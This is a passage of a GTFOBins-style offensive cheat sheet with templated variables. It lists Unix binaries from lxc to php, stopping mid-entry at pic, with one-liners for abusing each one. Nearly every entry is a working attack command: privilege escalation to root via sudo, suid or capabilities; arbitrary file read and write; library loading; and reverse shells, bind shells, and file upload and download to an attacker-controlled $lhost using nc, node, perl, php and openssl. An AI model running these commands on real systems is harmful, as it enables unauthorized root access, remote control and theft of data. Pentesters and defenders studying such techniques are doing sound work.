This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):  ``` git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sudo ./build-alpine -a i686 ```

```sh title:"sudo / suid"
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```
<!-- cheat
-->

## m4

### m4 shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
```
<!-- cheat
-->

### m4 command

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
echo 'esyscmd($cmd_file)' | m4
```
<!-- cheat
var cmd_file
-->

### m4 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
m4 $file_in
```
<!-- cheat
var file_in
-->

## mail

### mail shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
mail --exec='!/bin/sh'
```
<!-- cheat
-->

### mail shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
mail -f /etc/hosts
!/bin/sh
```
<!-- cheat
-->

## make

### make shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
make --eval='$(shell /bin/sh 1>&0)' .
```
<!-- cheat
-->

### make file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
make -s --eval='$(file >/dev/stdout,$(file <$file_in))' .
```
<!-- cheat
var file_in
-->

### make file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
make -s --eval='$(file >$file_out,$data)' .
```
<!-- cheat
var data
var file_out
-->

## man

### man shell

This requires GNU `troff` (`groff`) to be installed.

```sh title:"sudo / suid / unprivileged"
man '-H/bin/sh #' man
```
<!-- cheat
-->

### man file-read

The file is shown somehow formatted and displayed in the default pager.

```sh title:"sudo / suid / unprivileged"
man $file_in
```
<!-- cheat
var file_in
-->

### man inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
man man
```
<!-- cheat
-->

## mawk

### mawk shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
mawk 'BEGIN {system("/bin/sh")}'
```
<!-- cheat
-->

### mawk file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
mawk '//' $file_in
```
<!-- cheat
var file_in
-->

### mawk file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
mawk 'BEGIN { print "$data" > "$file_out" }'
```
<!-- cheat
var data
var file_out
-->

## minicom

Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.

### minicom shell #1

Start the following command to open the TUI interface, then:  1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell.  After the shell, exit with `Ctrl-A x`.

```sh title:"sudo / suid / unprivileged"
minicom -D /dev/null
```
<!-- cheat
-->

### minicom shell #2

After the shell, exit with `Ctrl-A x`.

```sh title:"sudo / suid / unprivileged"
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >$tmp_file
minicom -D /dev/null -S $tmp_file
reset^J
```
<!-- cheat
var tmp_file
-->

## more

### more shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
more /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### more file-read

The file is displayed in the terminal interface.

```sh title:"sudo / suid / unprivileged"
more $file_in
```
<!-- cheat
var file_in
-->

## mosh-server

### mosh-server shell

This requires a valid SSH access.

```sh title:"sudo"
mosh --server=mosh-server localhost /bin/sh
```
<!-- cheat
-->

## mosquitto

### mosquitto file-read

The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.

```sh title:"sudo / suid / unprivileged"
mosquitto -c $file_in
```
<!-- cheat
var file_in
-->

## mount

### mount privilege-escalation

This overrides `mount` itself with a shell (or any other executable).

```sh title:"sudo"
mount -o bind /bin/sh /bin/mount
mount
```
<!-- cheat
-->

## msfconsole

### msfconsole inherit (inherits from irb)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
msfconsole
irb
```
<!-- cheat
-->

## msgattrib

### msgattrib file-read

The file is parsed and displayed as a Java `.properties` file.

```sh title:"sudo / suid / unprivileged"
msgattrib -P $file_in
```
<!-- cheat
var file_in
-->

## msgcat

### msgcat file-read

The file is parsed and displayed as a Java `.properties` file.

```sh title:"sudo / suid / unprivileged"
msgcat -P $file_in
```
<!-- cheat
var file_in
-->

## msgconv

### msgconv file-read

The file is parsed and displayed as a Java `.properties` file.

```sh title:"sudo / suid / unprivileged"
msgconv -P $file_in
```
<!-- cheat
var file_in
-->

## msgfilter

### msgfilter shell

The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.

```sh title:"sudo / suid / unprivileged"
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```
<!-- cheat
-->

#### msgfilter shell - suid override

```sh title:"suid variant"
echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```
<!-- cheat
-->

### msgfilter file-read

The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.

```sh title:"sudo / suid / unprivileged"
msgfilter -P -i $file_in /bin/cat
```
<!-- cheat
var file_in
-->

## msgmerge

### msgmerge file-read

The file is parsed and displayed as a Java `.properties` file.

```sh title:"sudo / suid / unprivileged"
msgmerge -P $file_in /dev/null
```
<!-- cheat
var file_in
-->

## msguniq

### msguniq file-read

The file is parsed and displayed as a Java `.properties` file.

```sh title:"sudo / suid / unprivileged"
msguniq -P $file_in
```
<!-- cheat
var file_in
-->

## mtr

### mtr file-read

The file is actually parsed, thus the content is corrupted by error prints.

```sh title:"sudo / unprivileged"
mtr --raw -F $file_in
```
<!-- cheat
var file_in
-->

## multitime

### multitime shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
multitime /bin/sh
```
<!-- cheat
-->

#### multitime shell - suid override

```sh title:"suid variant"
multitime /bin/sh -p
```
<!-- cheat
-->

## mutt

### mutt file-read

The file is leaked as error messages.

```sh title:"sudo / unprivileged"
mutt -F $file_in
```
<!-- cheat
var file_in
-->

## mv

### mv file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
mv $tmp_file $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### mv privilege-escalation

This can be used to move and then read or write files from a restricted file systems or with elevated privileges.

```sh title:"sudo / suid"
mv $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## mypy

### mypy file-read

Partial content is leaked as error messages.

```sh title:"sudo / unprivileged"
mypy $file_in
```
<!-- cheat
var file_in
-->

### mypy file-write

Partial content is leaked as error messages inside some XML tags.

```sh title:"sudo / unprivileged"
mypy $file_in --junit-xml $file_out
```
<!-- cheat
var file_in
var file_out
-->

## mysql

A valid MySQL server must be available to connect to.

### mysql shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
mysql -e '\! /bin/sh'
```
<!-- cheat
-->

### mysql library-load

The following loads the `$lib` shared object.

```sh title:"sudo / suid / unprivileged"
mysql --default-auth ../../../../.$lib
```
<!-- cheat
var lib
-->

## nano

### nano shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
nano
^R^X
reset; sh 1>&0 2>&0
```
<!-- cheat
-->

### nano shell #2

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

```sh title:"sudo / suid / unprivileged"
nano -s /bin/sh
/bin/sh
^T^T
```
<!-- cheat
-->

#### nano shell #2 - suid override

```sh title:"suid variant"
nano -s '/bin/sh -p'
/bin/sh -p
^T^T
```
<!-- cheat
-->

### nano file-read

The file content is displayed in the terminal interface.

```sh title:"sudo / suid / unprivileged"
nano $file_in
```
<!-- cheat
var file_in
-->

### nano file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
nano $file_out
$data
^O
```
<!-- cheat
var data
var file_out
-->

## nasm

### nasm file-read

The file content is treated as command line options and disclosed throught error messages.

```sh title:"sudo / suid / unprivileged"
nasm -@ $file_in
```
<!-- cheat
var file_in
-->

## nawk

Alias of [gawk](#gawk). All techniques from `gawk` apply.

## nc

### nc reverse-shell

This only works with netcat traditional.

```sh title:"sudo / suid / unprivileged"
nc -e /bin/sh $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### nc bind-shell

This only works with netcat traditional.

```sh title:"sudo / suid / unprivileged"
nc -l -p $lport -e /bin/sh
```
<!-- cheat
import lports
-->

### nc download #1

The file is actually written by the invoking shell.

```sh title:"sudo / suid / unprivileged"
nc -l -p $lport >$file_out
```
<!-- cheat
import lports
var file_out
-->

### nc download #2

The file is actually written by the invoking shell.

```sh title:"sudo / suid / unprivileged"
nc $lhost $lport >$file_out
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### nc upload #1

The file is actually read by the invoking shell.

```sh title:"sudo / suid / unprivileged"
nc -l -p $lport <$file_in
```
<!-- cheat
import lports
var file_in
-->

### nc upload #2

The file is actually read by the invoking shell.

```sh title:"sudo / suid / unprivileged"
nc $lhost $lport <$file_in
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## ncdu

### ncdu shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ncdu
b
```
<!-- cheat
-->

## ncftp

### ncftp shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ncftp
!/bin/sh
```
<!-- cheat
-->

#### ncftp shell - suid override

```sh title:"suid variant"
ncftp
!/bin/sh -p
```
<!-- cheat
-->

## needrestart

### needrestart inherit (inherits from perl)

This allows to run Perl code (`...`).

```sh title:"sudo / unprivileged"
echo '...' >$tmp_file
needrestart -c $tmp_file
```
<!-- cheat
var tmp_file
-->

## neofetch

### neofetch shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo 'exec /bin/sh' >$tmp_file
neofetch --config $tmp_file
```
<!-- cheat
var tmp_file
-->

### neofetch file-read

The file content is used as the logo while some other information is displayed on its right.

```sh title:"sudo / unprivileged"
neofetch --ascii $file_in
```
<!-- cheat
var file_in
-->

## nft

### nft file-read

The content is actually parsed and corrupted by the command.

```sh title:"sudo / unprivileged"
nft -f $file_in
```
<!-- cheat
var file_in
-->

## nginx

### nginx download

Pull a remote file to disk.

```sh title:"sudo"
cat >$tmp_file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### nginx upload

Push a local file to a remote receiver.

```sh title:"sudo"
cat >$tmp_file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### nginx library-load

Alternatively, the `ssl_engine` directive can be used.

```sh title:"sudo / suid / unprivileged"
cat >$tmp_file <<EOF
load_module $lib
EOF

nginx -t -c $tmp_file
```
<!-- cheat
var lib
var tmp_file
-->

## nice

### nice shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
nice /bin/sh
```
<!-- cheat
-->

#### nice shell - suid override

```sh title:"suid variant"
nice /bin/sh -p
```
<!-- cheat
-->

## nl

### nl file-read

The read file content is corrupted by a leading space added to each line.

```sh title:"sudo / suid / unprivileged"
nl -bn -w1 -s '' $file_in
```
<!-- cheat
var file_in
-->

## nm

### nm file-read

The file content is treated as command line options and disclosed through error messages.

```sh title:"sudo / suid / unprivileged"
nm $file_in
```
<!-- cheat
var file_in
-->

## nmap

### nmap shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
nmap --interactive
!/bin/sh
```
<!-- cheat
-->

### nmap file-read

The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.

```sh title:"sudo / suid / unprivileged"
nmap -iL $file_in
```
<!-- cheat
var file_in
-->

### nmap file-write

The payload appears inside the regular nmap output.

```sh title:"sudo / suid / unprivileged"
nmap -oG=$file_out $data
```
<!-- cheat
var data
var file_out
-->

### nmap inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
echo '...' >$tmp_file
nmap --script=$tmp_file
```
<!-- cheat
var tmp_file
-->

## node

### node shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

#### node shell - capabilities override

```sh title:"capabilities variant"
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

#### node shell - suid override

```sh title:"suid variant"
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

### node reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect($lport, "$lhost", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
<!-- cheat
import tun_ip
import lports
-->

#### node reverse-shell - suid override

```sh title:"suid variant"
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").connect($lport, "$lhost", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
<!-- cheat
import tun_ip
import lports
-->

### node bind-shell

Bind a shell to a local port for the attacker to connect to.

```sh title:"sudo / suid / unprivileged"
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen($lport)'
```
<!-- cheat
import lports
-->

#### node bind-shell - suid override

```sh title:"suid variant"
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen($lport)'
```
<!-- cheat
import lports
-->

### node file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
node -e 'process.stdout.write(require("fs").readFileSync("$file_in"))'
```
<!-- cheat
var file_in
-->

### node file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
node -e 'require("fs").writeFileSync("$file_out", "$data")'
```
<!-- cheat
var data
var file_out
-->

### node download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
node -e 'require("http").get("$scheme://$lhost$file_in", res => res.pipe(require("fs").createWriteStream("$file_out")))'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### node upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
node -e 'require("fs").createReadStream("$file_in").pipe(require("http").request("$scheme://$lhost$file_out"))'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## nohup

### nohup shell

This creates a `nohup.out` file in the current working directory.

```sh title:"sudo / suid / unprivileged"
nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
```
<!-- cheat
-->

#### nohup shell - suid override

```sh title:"suid variant"
nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
```
<!-- cheat
-->

### nohup command

The `nohup.out` file contains the standard output and error of the command.

```sh title:"sudo / suid / unprivileged"
nohup $cmd_file
cat nohup.out
```
<!-- cheat
var cmd_file
-->

## npm

### npm shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
npm exec /bin/sh
```
<!-- cheat
-->

### npm shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i
```
<!-- cheat
-->

### npm shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
```
<!-- cheat
-->

## nroff

### nroff shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff
```
<!-- cheat
-->

### nroff file-read

The file is typeset and some warning messages may appear.

```sh title:"sudo / unprivileged"
nroff $file_in
```
<!-- cheat
var file_in
-->

## nsenter

### nsenter shell

The shell command can be omitted.

```sh title:"sudo / suid / unprivileged"
nsenter /bin/sh
```
<!-- cheat
-->

#### nsenter shell - suid override

```sh title:"suid variant"
nsenter /bin/sh -p
```
<!-- cheat
-->

## ntpdate

### ntpdate file-read

The file is actually parsed and lines are leaked through error messages.

```sh title:"sudo / suid / unprivileged"
ntpdate -a x -k $file_in -d localhost
```
<!-- cheat
var file_in
-->

## nvim

Alias of [vim](#vim). All techniques from `vim` apply.

## octave

The payloads are compatible with GUI mode.

### octave shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
octave-cli --eval 'system("/bin/sh")'
```
<!-- cheat
-->

### octave file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
octave-cli --eval 'format none; fid = fopen("$file_in"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```
<!-- cheat
var file_in
-->

### octave file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
octave-cli --eval 'fid = fopen("$file_out", "w"); fputs(fid, "$data"); fclose(fid);'
```
<!-- cheat
var data
var file_out
-->

## od

### od file-read

Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.

```sh title:"sudo / suid / unprivileged"
od -An -c -w999 $file_in
```
<!-- cheat
var file_in
-->

## opencode

### opencode command

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
opencode
! $cmd_file
```
<!-- cheat
var cmd_file
-->

### opencode inherit (inherits from sqlite3)

This allows to run SQLite queries (`...`) provided that `sqlite3` is installed.

```sh title:"sudo / unprivileged"
opencode db '...'
```
<!-- cheat
-->

## openssl

### openssl reverse-shell

The shell process is not spawn by `openssl`.

```sh title:"sudo / suid / unprivileged"
mkfifo $tmp_sock
/bin/sh -i <$tmp_sock 2>&1 | openssl s_client -quiet -connect $lhost:$lport >$tmp_sock
```
<!-- cheat
import tun_ip
import lports
var tmp_sock
-->

### openssl file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
openssl enc -in $file_in
```
<!-- cheat
var file_in
-->

### openssl file-write #1

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | openssl enc -out $file_out
```
<!-- cheat
var data
var file_out
-->

### openssl file-write #2

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
openssl enc -in $file_in -out $file_out
```
<!-- cheat
var file_in
var file_out
-->

### openssl download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
openssl s_client -quiet -connect $lhost:$lport >$file_out
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### openssl upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
openssl s_client -quiet -connect $lhost:$lport <$file_in
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### openssl library-load

Load an attacker-supplied shared library.

```sh title:"sudo / suid / unprivileged"
openssl req -engine ./lib.so
```
<!-- cheat
-->

## openvpn

### openvpn shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```
<!-- cheat
-->

#### openvpn shell - suid override

```sh title:"suid variant"
openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
```
<!-- cheat
-->

### openvpn file-read

The file is actually parsed and the first partial wrong line is returned in an error message.

```sh title:"sudo / suid / unprivileged"
openvpn --config $file_in
```
<!-- cheat
var file_in
-->

## openvt

### openvt command

The command execution is displayed on the virtual console.

```sh title:"sudo"
openvt -- $cmd_file
```
<!-- cheat
var cmd_file
-->

## opkg

### opkg shell

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```

```sh title:"sudo"
rpm opkg install x_1.0_all.deb
```
<!-- cheat
-->

## pandoc

### pandoc file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
pandoc -t plain $file_in
```
<!-- cheat
var file_in
-->

### pandoc file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | pandoc -t plain -o $file_out
```
<!-- cheat
var data
var file_out
-->

### pandoc inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
echo '...' >$tmp_file
pandoc -L $tmp_file /dev/null
```
<!-- cheat
var tmp_file
-->

## passwd

### passwd privilege-escalation

This changes the root password to `x`, so it's now possible to log in using, for example, `su`.

```sh title:"sudo"
echo -e 'x\nx' | passwd
```
<!-- cheat
-->

## paste

### paste file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
paste $file_in
```
<!-- cheat
var file_in
-->

## pax

### pax file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
pax -w $file_in | tar -xO
```
<!-- cheat
var file_in
-->

## pdb

### pdb inherit (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo / unprivileged"
echo '...' >$tmp_file
pdb $tmp_file
cont
```
<!-- cheat
var tmp_file
-->

## pdflatex

### pdflatex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```
<!-- cheat
-->

### pdflatex file-read

The read file will be part of the PDF output.

```sh title:"sudo / suid / unprivileged"
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
pdftotext texput.pdf -
```
<!-- cheat
var file_in
-->

### pdflatex file-write

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```sh title:"sudo / suid / unprivileged"
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
```
<!-- cheat
var data
-->

## pdftex

### pdftex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pdftex --shell-escape '\write18{/bin/sh}\end'
```
<!-- cheat
-->

## perf

### perf shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
perf stat /bin/sh
```
<!-- cheat
-->

#### perf shell - suid override

```sh title:"suid variant"
perf stat /bin/sh -p
```
<!-- cheat
-->

## perl

### perl shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / unprivileged"
perl -e 'exec "/bin/sh"'
```
<!-- cheat
-->

#### perl shell #1 - capabilities override

```sh title:"capabilities variant"
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```
<!-- cheat
-->

### perl shell #2

The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.

```sh title:"sudo / unprivileged"
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```
<!-- cheat
-->

### perl reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
<!-- cheat
import tun_ip
import lports
-->

### perl file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
perl -ne print $file_in
```
<!-- cheat
var file_in
-->

### perl download

Pull a remote file to disk.

```sh title:"sudo / unprivileged"
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"$lhost",PeerPort=>80,Proto=>"tcp") or die; print $s "GET $file_in HTTP/1.1\r\nHost: $lhost\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "$file_out") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### perl upload

Push a local file to a remote receiver.

```sh title:"sudo / unprivileged"
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"$lhost", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "$file_in") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: $lhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
```
<!-- cheat
import tun_ip
var file_in
-->

## perlbug

### perlbug shell

This requires to press `Enter` serveral times before the shell is spawn.

```sh title:"sudo / unprivileged"
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
```
<!-- cheat
-->

## pexec

### pexec shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pexec /bin/sh
```
<!-- cheat
-->

#### pexec shell - suid override

```sh title:"suid variant"
pexec /bin/sh -p
```
<!-- cheat
-->

## pg

### pg shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pg /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### pg file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
pg $file_in
```
<!-- cheat
var file_in
-->

## php

### php shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
php -r 'system("/bin/sh -i");'
```
<!-- cheat
-->

#### php shell #1 - capabilities override

```sh title:"capabilities variant"
php -r 'posix_setuid(0); system("/bin/sh -i");'
```
<!-- cheat
-->

### php shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
php -r 'passthru("/bin/sh -i");'
```
<!-- cheat
-->

#### php shell #2 - capabilities override

```sh title:"capabilities variant"
php -r 'posix_setuid(0); passthru("/bin/sh -i");'
```
<!-- cheat
-->

### php shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
<!-- cheat
-->

#### php shell #3 - capabilities override

```sh title:"capabilities variant"
php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
<!-- cheat
-->

### php shell #4

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
php -r 'pcntl_exec("/bin/sh");'
```
<!-- cheat
-->

#### php shell #4 - capabilities override

```sh title:"capabilities variant"
php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
```
<!-- cheat
-->

#### php shell #4 - suid override

```sh title:"suid variant"
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```
<!-- cheat
-->

### php command #1

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
php -r 'echo shell_exec("$cmd_file");'
```
<!-- cheat
var cmd_file
-->

### php command #2

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
php -r '$r=array(); exec("$cmd_file", $r); print(join("\n",$r));'
```
<!-- cheat
var cmd_file
-->

### php command #3

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("$cmd_file", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```
<!-- cheat
var cmd_file
-->

### php reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```
<!-- cheat
import tun_ip
import lports
-->

### php file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
php -r 'readfile("$file_in");'
```
<!-- cheat
var file_in
-->

### php file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
php -r 'file_put_contents("$file_out", "$data");'
```
<!-- cheat
var data
var file_out
-->

### php download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
php -r '$c=file_get_contents("$scheme://$lhost$file_in"); file_put_contents("$file_out", $c);'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### php upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
php -S 0.0.0.0:80
```
<!-- cheat
-->

## pic

### pic shell

